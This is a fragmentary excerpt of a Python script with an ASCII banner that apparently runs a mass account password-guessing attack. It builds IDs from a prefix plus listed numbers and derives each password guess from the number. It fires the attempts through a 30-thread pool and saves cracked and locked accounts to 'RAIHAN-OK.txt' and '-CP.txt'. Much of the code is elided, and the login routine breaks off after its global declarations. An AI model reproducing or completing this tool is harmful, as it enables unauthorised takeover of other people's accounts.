...
█ ________    _       _______  _____  _____  ___  ____    
|_   __  |  / \     |_   __ \|_   _||_   _||_  ||_  _|   
  | |_ \_| / _ \      | |__) | | |    | |    | |_/ /     
  |  _|   / ___ \     |  __ /  | '    ' |    |  __'.     
 _| |_  _/ /   \ \_  _| |  \ \_ \ \__/ /    _| |  \ \_   
|_____||____| |____||____| |___| `.__.'    |____||____|  
...
def Main():
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        for love in user:
            uid = code+love
            pwx = [love[2:]]
            asha.submit(RAIHAN,uid,pwx,tl)
    print('-------------------')
    print(' [~] WORK IS DONE BABE')
    print(' [+] Ids saved in RAIHAN-OK.txt,-CP.txt')
    print('-------------------')
def RAIHAN(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
